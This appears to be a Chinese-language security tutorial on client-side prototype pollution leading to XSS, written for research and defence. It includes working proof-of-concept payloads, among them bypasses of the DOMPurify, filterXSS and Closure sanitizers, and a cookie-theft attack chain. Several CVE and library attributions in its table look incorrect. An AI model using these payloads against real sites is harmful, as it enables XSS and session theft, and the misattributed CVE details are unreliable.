---
attack_surface: [注入类, 客户端利用, 编码/序列化滥用]
impact: [远程代码执行, 信息泄露, 权限提升]
risk_level: 高
prerequisites:
  - JavaScript 原型链机制
  - DOM/XSS 基础
  - Chrome DevTools 使用
difficulty: 高级
related_techniques:
  - xss-cross-site-scripting
  - dom-xss
  - csp-bypass
  - postmessage-vulnerabilities
  - html-sanitizer-bypass
  - ssrf-server-side-request-forgery
tools:
  - DOM Invader (Burp Suite v2023.6+)
  - ppfuzz
  - ppmap
  - proto-find
  - PPScan
  - protoStalker
---

# Client-Side Prototype Pollution — 从原型链污染到 XSS

---

# 0x01 背景与原理

## 1.1 什么是 Prototype Pollution

JavaScript 中每个对象都有一个内部引用指向其原型（`__proto__`），原型本身也是对象，最终指向 `Object.prototype`。这形成了一条**原型链**：

```javascript
obj.__proto__ → Constructor.prototype → Object.prototype → null
```

**Prototype Pollution** 指攻击者能够**修改 `Object.prototype`**，从而影响整个 JavaScript 运行环境中所有对象的属性。一旦污染，任何访问未定义属性的代码都可能触发攻击者注入的值。

## 1.2 为什么会发生

核心前提：**递归合并（recursive merge）、路径赋值（path-based property assignment）、对象克隆（object cloning）** 三类操作中对 `__proto__` / `constructor.prototype` 的不当处理。

```javascript
// 漏洞模式 1: 递归合并
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      merge(target[key], source[key]);  // ← 递归深度合并
    } else {
      target[key] = source[key];        // ← 直接赋值到原型链
    }
  }
}
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin); // true — 全局污染
```

```javascript
// 漏洞模式 2: 路径赋值
// 输入: constructor[prototype][isAdmin]=true
obj[keys[0]][keys[1]][keys[2]] = value;  // → Object.prototype.isAdmin = true
```

```javascript
// 漏洞模式 3: 从特定对象遍历到 Object.prototype
// 如果你能污染某个对象的属性，可以沿原型链溯及 Object.prototype
let target = someObject;
target.__proto__.__proto__.polluted = "yes";  // 到达 Object.prototype
```

## 1.3 客户端 vs 服务端原型污染

| 维度 | 服务端 (Node.js) | 客户端 (浏览器) |
|------|-----------------|----------------|
| 入口 | HTTP Body JSON → `merge()` / `lodash` | URL 参数 / `location.hash` / `postMessage` / `localStorage` |
| 污染目标 | `child_process.exec()` / `eval()` | `innerHTML` / `srcdoc` / `URL()` / `Worker()` |
| 最终效果 | RCE | **DOM XSS** |
| 检测工具 | Burp Server-Side PP Scanner | DOM Invader / ppfuzz / PPScan |

本文聚焦**客户端方向**。

---

# 0x02 检测与发现

## 2.1 自动化工具

| 工具 | 类型 | 特性 |
|------|------|------|
| [ppfuzz](https://github.com/dwisiswant0/ppfuzz) | CLI | 原型污染 Fuzzer，v2.0 支持 ES modules、HTTP/2、WebSocket |
| [ppmap](https://github.com/kleiton0x00/ppmap) | CLI | 自动发现 PP 漏洞并生成 PoC |
| [proto-find](https://github.com/kosmosec/proto-find) | CLI | 源码扫描 |
| [PPScan](https://github.com/msrkp/PPScan) | 浏览器扩展 | 自动扫描访问页面中的 PP 漏洞 |
| [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) | Burp Suite v2023.6+ | 专用 Prototype-pollution 标签，自动变异参数名并检测 sink 点 |

## 2.2 调试：追踪属性访问来源

```javascript
// 在特定属性被访问时中断，追踪调用栈
Object.defineProperty(Object.prototype, "potentialGadget", {
  __proto__: null,
  get() {
    console.trace()
    return "test"
  },
})
```

## 2.3 定位漏洞根因

对于大型复杂代码库，使用 ppmap 获取 payload 后：

```javascript
// 1. 在页面第一行 JS 设置断点
// 2. 在断点处执行以下代码：
function debugAccess(obj, prop, debugGet = true) {
  var origValue = obj[prop]
  Object.defineProperty(obj, prop, {
    get: function () {
      if (debugGet) debugger
      return origValue
    },
    set: function (val) {
      debugger
      origValue = val
    },
  })
}
debugAccess(Object.prototype, "ppmap")

// 3. 恢复脚本执行 → Call Stack 中将显示污染发生位置
// 4. 优先检查 JavaScript 库文件的调用栈（PP 常发生在库代码中）
```

---

# 0x03 Gadget 挖掘

**Gadget** 是发现 PP 后**真正触发利用的代码片段**——即被污染的属性在何处被读取并以危险方式使用。

## 3.1 手动搜索

搜索关键字：`srcdoc`、`innerHTML`、`iframe`、`createElement`、`src`、`onerror`

## 3.2 浏览器内置 Gadget（2023+ PortSwigger 研究）

2023 年中 PortSwigger 研究团队发表的论文证明：**浏览器内置对象本身即可作为可靠的 XSS Gadget**。因为这些对象存在于每个页面，即使目标应用代码从未触及被污染的属性，也能获得代码执行。

**示例 — `URL()` 构造函数**：

```html
<script>
    // 入口: https://victim/?__proto__[href]=javascript:alert(document.domain)
    // 演示直接污染：
    Object.prototype.href = 'javascript:alert(`polluted`)';

    // Sink — URL() 构造函数隐式读取 href 属性
    new URL('#');  // Chrome 弹出 alert，Firefox 加载 "javascript:" URL
</script>
```

**已验证的全局 Gadget 表（测试于 2024.11）**：

| Gadget 类 | 读取属性 | 效果 |
|-----------|---------|------|
| `Notification` | `title` | 通过通知点击触发 `alert()` |
| `Worker` | `name` | 在独立 Worker 中执行 JS |
| `Image` | `src` | 传统 `onerror` XSS |
| `URLSearchParams` | `toString` | DOM-based Open Redirect |
| `URL` | `href` | `new URL('#')` → JS 执行 |

> PortSwigger 完整论文列出了 11 个 Gadget，包括沙箱逃逸讨论。

## 3.3 Gadget 查找案例：Mithil 库

```javascript
// 来自 Intigriti 挑战题 writeup
// Mithil 库中的 PP gadget 链：污染属性 → 模板渲染 → XSS
```

参考：[Mithil library PP gadget writeup](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## 3.4 已知 Gadget Payload 库

- [PortSwigger XSS Cheat Sheet — Prototype Pollution 章节](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution) — 按库分类的已知 PP Gadget 集合

---

# 0x04 HTML Sanitizer 绕过

Prototype Pollution 可以**修改 HTML Sanitizer 的白名单配置**，使其允许原本被过滤的危险属性/标签。

## 4.1 sanitize-html 绕过

```javascript
// 污染白名单 → filterXSS 放行 onerror 和 src
Object.prototype.whiteList = {img: ['onerror', 'src']}
filterXSS('test <img src onerror=alert(1)>')
// 输出: "test <img src onerror="alert(1)">"  ← XSS payload 未被过滤
```

## 4.2 DOMPurify 绕过

```javascript
// 污染允许属性列表 → DOMPurify 放行 onerror
Object.prototype.ALLOWED_ATTR = ['onerror', 'src']
DOMPurify.sanitize('<img src onerror=alert(1)>')
// 输出: "<img onerror="alert(1)" src="">"  ← sanitizer 被绕过
```

## 4.3 Closure Sanitizer 绕过

```html
<!-- 来自 securitum 研究 -->
<script>
  Object.prototype['* ONERROR'] = 1;
  Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
  goog.require('goog.html.sanitizer.HtmlSanitizer');
  goog.require('goog.dom');
</script>
<body>
<script>
  const html = '<img src onerror=alert(1)>';
  const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
  const sanitized = sanitizer.sanitize(html);
  const node = goog.dom.safeHtmlToNode(sanitized);
  document.body.append(node);  // ← XSS 触发
</script>
```

---

# 0x05 工具与自动化（2023–2025）

| 工具 | 发布 | 关键能力 |
|------|------|----------|
| **DOM Invader** | Burp v2023.6 | 自动变异 `__proto__` / `constructor.prototype` 参数，检测 sink 点；触发 gadget 时显示执行栈 |
| **protoStalker** | 2024 | Chrome DevTools 插件，实时可视化原型链，标记对 `onerror`、`innerHTML`、`srcdoc`、`id` 等危险 key 的写入 |
| **ppfuzz 2.0** | 2025 | 支持 ES modules、HTTP/2、WebSocket；`-A browser` 模式启动 headless Chromium 自动枚举 gadget 类 |

---

# 0x06 近期 CVE 与实战案例

| 年份 | CVE | 组件 | 机制 | 影响 |
|------|-----|------|------|------|
| 2024 | CVE-2024-45801 | DOMPurify ≤ 3.0.8 | 污染 `Node.prototype.after` 绕过 SAFE_FOR_TEMPLATES | 存储型 XSS |
| 2023 | CVE-2023-26136 | jQuery 3.6.0-3.6.3 | `$.extend()` 接收 `location.hash` 输入污染 `Object.prototype` | DOM XSS |
| 2023 | CVE-2023-26140 | jQuery 3.6.0-3.6.3 | 同上变体 | DOM XSS |
| 2023 | — | sanitize-html < 2.8.1 | `{"__proto__":{"innerHTML":"<img/src/onerror=alert(1)>"}}` 绕过白名单 | XSS |

> 即使漏洞库仅在客户端使用，反射参数、postMessage 处理器或稍后渲染的存储数据仍可远程触发。

---

# 0x07 攻击链建模

## 7.1 经典链：URL → PP → XSS → 数据窃取

```
[location.hash] → [merge() 污染 Object.prototype]
    → [应用代码读取被污染属性到 innerHTML]
    → [XSS 执行] → [fetch() 外带 Cookie/LocalStorage]
```

## 7.2 浏览器内置链：PP → URL() 构造器 → JS 执行

```
[__proto__[href]=javascript:...] → [new URL('#')]
    → [隐式读取 Object.prototype.href] → [JS 执行]
```

此链不依赖应用层代码——只要页面任何位置调用 `new URL()` 即可触发。

## 7.3 Sanitizer 绕过链

```
[PP 污染 sanitizer 配置] → [应用调用 sanitizer.sanitize(用户输入)]
    → [危险标签/属性未被过滤] → [XSS via innerHTML]
```

## 7.4 postMessage 联动

```
[父窗口 postMessage({__proto__: {xxx: payload}})]
    → [子窗口 merge() 处理 message.data]
    → [Object.prototype 污染] → [XSS 在子窗口 origin 执行]
```

---

# 0x08 防御策略

## 8.1 开发层面

1. **冻结全局原型**（作为页面第一段脚本执行）：

```javascript
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Map.prototype);
```

> 注意：可能破坏依赖后期原型扩展的 polyfill。

2. **使用 `structuredClone()`** 代替 `JSON.parse(JSON.stringify())` 或社区 "deepMerge" 片段 — 它不遍历原型链、忽略 setter/getter。

3. **深合并使用安全版本**：lodash ≥ 4.17.22、deepmerge ≥ 5.3.0 已包含原型消毒。

4. **使用 `Object.create(null)`** 创建无原型映射，用 `Map` 代替 `Object` 做键值存储。

5. **使用 `Object.hasOwn()`** 检查属性是否为自有属性（非继承）。

6. **CSP**: `script-src 'self'` + 严格 nonce 可阻止大部分 `innerHTML` sink（但无法阻止 `location` 操纵类 gadget）。

## 8.2 检测层面

- ESLint + [eslint-plugin-prototype-pollution](https://github.com/) 在 CI 阶段拦截
- Code Review 重点检查：`for...in` 遍历、`merge`/`clone`/`extend` 函数、`obj[key1][key2] = value` 形式的赋值
- 运行时保护：npm security packages 检测并阻止 PP 攻击

---

# 0x09 参考资料

- [PortSwigger — Widespread Prototype Pollution Gadgets (11 browser built-in gadgets)](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
- [PortSwigger — XSS Cheat Sheet: Prototype Pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [BlackFan — Client-Side Prototype Pollution Gadget Collection](https://github.com/BlackFan/client-side-prototype-pollution)
- [Securitum — Prototype Pollution & Bypassing Client-Side HTML Sanitizers](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
- [Snyk — DOMPurify Prototype Pollution Bypass (CVE-2024-45801)](https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/)
- [Huli's Blog — Intigriti Revenge Challenge (Mithil PP gadget)](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)
- [Huli's Blog — Intigriti 0422 XSS Challenge (HTML element PP)](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/)
- [InfosecWriteups — Hunting for Prototype Pollution in JS Libraries](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [s1r1us — Prototype Pollution Research](https://blog.s1r1us.ninja/research/PP)
- [ppfuzz — Client-Side PP Fuzzer](https://github.com/dwisiswant0/ppfuzz)
- [ppmap — Prototype Pollution Detection](https://github.com/kleiton0x00/ppmap)
- [proto-find — Source Scanner](https://github.com/kosmosec/proto-find)
- [PPScan — Browser Extension](https://github.com/msrkp/PPScan)
